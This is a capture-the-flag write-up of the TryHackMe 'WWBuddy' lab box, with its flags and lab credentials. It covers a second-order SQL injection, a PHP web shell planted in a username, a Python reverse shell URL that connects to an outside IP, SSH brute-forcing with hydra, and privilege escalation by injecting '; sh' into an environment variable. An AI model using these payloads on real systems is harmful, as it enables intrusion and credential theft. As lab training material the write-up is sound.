> WWBuddy

**export IP=10.10.241.182**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
```

# Gobuster

sudo gobuster -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 20 -x php,txt,sql,bak -o gobuster/initial

```
/admin (Status: 301) => Can't access through our account
/api (Status: 301)
/change (Status: 301)
/chat.php (Status: 200)
/config.php (Status: 200)
/images (Status: 301)
/index.php (Status: 302)
/js (Status: 301)
/login (Status: 301)
/logout.php (Status: 302)
/profile (Status: 301)
/register (Status: 301)
```

We are provided with a login page here. So let's try to create an account and explore. I created an account `admin`:`admin123` . And I had a message from WWBuddy. We can try some basic 2nd order SQLi and let's change the username admin as `' or 1=1 -- a` and fill the details and change the password. Now all users must have the same password `password`. And we can't access `\admin` through WWBuddy neither `Roberta`

Logging into WWBuddy we can see another 2 users `Roberta` and `Henry`. And we can see the `/admin` page now.

```
Hey Henry, i didn't made the admin functions for this page yet, but at least you can see who's trying to sniff into our site here.
192.168.0.139 2020-07-24 22:54:34 WWBuddy fc18e5f4aa09bbbb7fdedf5e277dda00
192.168.0.139 2020-07-24 22:56:09 Roberto b5ea6181006480438019e76f8100249e 
```

And viewing the page-source we have the flag

# Website-Flag

```
THM{d0nt_try_4nyth1ng_funny}
```

Let's change the username of WWBuddy as `<?php system($_GET["cmd"]) ?>` and access admin page. And now log in as Henry and acessing /admin page show that we can execute php code. Spin a netcat session and access the url

`http://10.10.25.230/admin/?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.8.107.21%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27`

We have a shell!!

# SUID Files

find / -perm -u=s -type f 2>/dev/null

```
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/authenticate => Hmm interseting!
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/bin/su
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
```

Trying linpeas we have a log file `/var/log/mysql/general.log`. Looking inside we have 

`2020-07-25T15:01:40.143760Z	   12 Execute	SELECT id, username, password FROM users WHERE username = 'RobertoyVnocsXsf%X68wf'`

Looks like the credentials are `roberto`:`yVnocsXsf%X68wf`. We can SSH as `roberto`.
We have importante.txt

# user.txt

```
THM{g4d0_d+_kkkk}
```

importante.txt

```
A Jenny vai ficar muito feliz quando ela descobrir que foi contratada :DD

Não esquecer que semana que vem ela faz 26 anos, quando ela ver o presente que eu comprei pra ela, talvez ela até anima de ir em um encontro comigo.
```

# Translated importante.txt

```
Jenny will be very happy when she finds out she was hired: DD

Do not forget that next week she turns 26, when she sees the gift I bought her, maybe she even encourages to go on a date with me.
```

From the message earlier from Henry we can say her birthday will be SSH creds. 

# Finding Jenny's birthday

```
-rw-rw-r-- 1 roberto roberto  246 Jul 27 21:25 importante.txt
```

Let's create a basic python file to create a wordlsit based in birthdate. If we don't know we can look at the site to know the year and date.

And using the wordlist we created we can crack the SSH credentials using hydra

hydra -l jenny -P wordlist.txt ssh://10.10.25.230

```
[22][ssh] host: 10.10.25.230   login: jenny   password: 08/03/1994
```

Let's copy the /bin/authenticate to our local file. Let's analyse it!

Looking the file in r2 if uid is greater than 1000 we are not in developer dgroup. Let's try setting it to developers group.

```
$USER => jeeny
export USER="jenny; sh"
$USER => jenny; sh
authenticate => Now we are root!!
```

# root.txt

```
THM{ch4ng3_th3_3nv1r0nm3nt}
```